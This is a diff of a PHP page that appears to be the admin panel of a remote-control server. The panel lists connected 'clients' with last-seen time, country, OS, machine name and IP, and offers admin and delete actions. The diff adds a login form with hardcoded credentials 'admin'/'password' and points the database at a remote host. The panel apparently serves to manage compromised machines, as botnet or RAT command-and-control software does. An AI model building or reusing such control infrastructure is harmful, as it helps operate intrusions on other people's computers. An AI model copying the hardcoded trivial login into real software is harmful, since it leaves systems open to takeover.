@@ -1,4 +1,47 @@
-<?php  
+<?php
+
+session_start();
+
+// Hardcoded username and password (for demonstration purposes)
+$valid_username = 'admin';
+$valid_password = 'password';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = isset($_POST['username']) ? $_POST['username'] : '';
+    $password = isset($_POST['password']) ? $_POST['password'] : '';
+
+    if ($username === $valid_username && $password === $valid_password) {
+        // Valid credentials - set a session variable to mark the user as authenticated
+        $_SESSION['authenticated'] = true;
+    } else {
+        echo "Invalid username or password";
+    }
+}
+
+// If the user is not authenticated, show the login form
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Login</title>
+    </head>
+    <body>
+        <h2>Login</h2>
+        <form method="post" action="">
+            <label for="username">Username:</label><br>
+            <input type="text" id="username" name="username"><br>
+            <label for="password">Password:</label><br>
+            <input type="password" id="password" name="password"><br><br>
+            <input type="submit" value="Login">
+        </form>
+    </body>
+    </html>
+    <?php
+    exit; // Stop further execution if the user is not authenticated
+}
+
+
 	if(isset($_GET['client']) && !empty($_GET['client'])){
 		$client =  $_GET['client'] ;
 	}
@@ -71,7 +114,7 @@
 
 	<h2>Administration</h2>
 	<?php
-	$db = new mysqli('localhost', 'root','', 'controlserver');
+        $db = new mysqli('sql112.example.com', 'user','pass', 'if0_34460391_clients');
 	if(mysqli_connect_errno()) exit;
 	echo '<p>Connected</p>';
 	
@@ -97,9 +140,11 @@
 	
 	$query = "SELECT idle, id, name, ip, os, country FROM clients LIMIT " . $pageFirst . ',' . $pageLimit;
 	$stmt = $db->prepare($query);
-	$stmt->bind_result($idle, $id, $name, $ip, $os, $country);
+    
+    $stmt->bind_result($idle, $id, $name, $ip, $os, $country);
 	$stmt->execute();
-	
+
+
 	
 	echo '<table>';
 	echo '<tr><th>Last Seen (h|m|s)</th><th>ID</th><th>Country</th><th>OS</th><th>Machine</th><th>IP</th><th>Admin</th><th>Delete</th></tr>';
@@ -131,7 +176,7 @@
 if(isset($_GET['id']) && !empty($_GET['id'])){
 	$id = $_GET['id'];
 	
-	$db = new mysqli('localhost', 'root','', 'controlserver');
+        $db = new mysqli('sql112.example.com', 'user','pass', 'if0_34460391_clients');
 	if(mysqli_connect_errno()) exit;
 
 	$query = "DELETE FROM clients WHERE id=?";
